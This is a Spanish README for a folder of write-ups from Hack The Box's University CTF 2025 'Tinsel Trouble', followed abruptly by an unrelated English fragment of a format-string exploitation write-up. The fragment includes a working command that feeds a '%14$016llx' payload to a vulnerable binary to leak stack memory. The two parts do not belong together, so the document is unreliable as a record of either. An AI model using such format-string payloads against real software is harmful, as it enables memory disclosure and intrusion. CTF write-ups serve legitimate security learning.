
# University CTF 2025 - Tinsel Trouble (Hack The Box)

Este directorio contiene los writeups de los retos que resolvimos en el **University CTF 2025 - Tinsel Trouble**, organizado por Hack The Box.

---

## Estructura
Cada subcarpeta corresponde a un reto específico del CTF.

## Información básica
- **Evento:** University CTF 2025 - Tinsel Trouble
- **Organizador:** Hack The Box
- **Formato:** CTF con retos de distintas categorías (Web, Crypto, Forensics, etc.)
- **Objetivo:** Documentar los pasos y aprendizajes de cada reto.

Our token can be found in the 14'th word in the dump, which correlates with the 14'th dummy format string argument. To verify we can print just our token argument:

    $ echo $(python3 -c 'print("B"*8 + ".%14$016llx")') | ./vuln 
    You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
    Here's your input: BBBBBBBB.4242424242424242
    sus = 0x21737573
    You can do better!

